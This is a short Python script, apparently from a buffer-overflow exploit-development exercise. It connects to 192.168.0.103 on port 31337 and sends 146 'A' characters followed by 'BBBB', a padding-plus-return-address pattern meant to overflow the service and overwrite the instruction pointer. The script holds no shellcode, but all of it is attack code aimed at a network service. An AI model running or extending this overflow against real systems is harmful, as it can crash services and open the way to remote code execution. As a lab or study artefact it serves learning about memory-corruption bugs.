#!/usr/bin/python

import socket,sys

from time import sleep

ip="192.168.0.103"

port="31337"

bof = "A" * 146 + "BBBB"
try:

    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    s.connect(('192.168.0.103',31337))

    s.send(bof + '\r\n')

    s.recv(1024)

    s.close()

except:

    sys.exit(0)
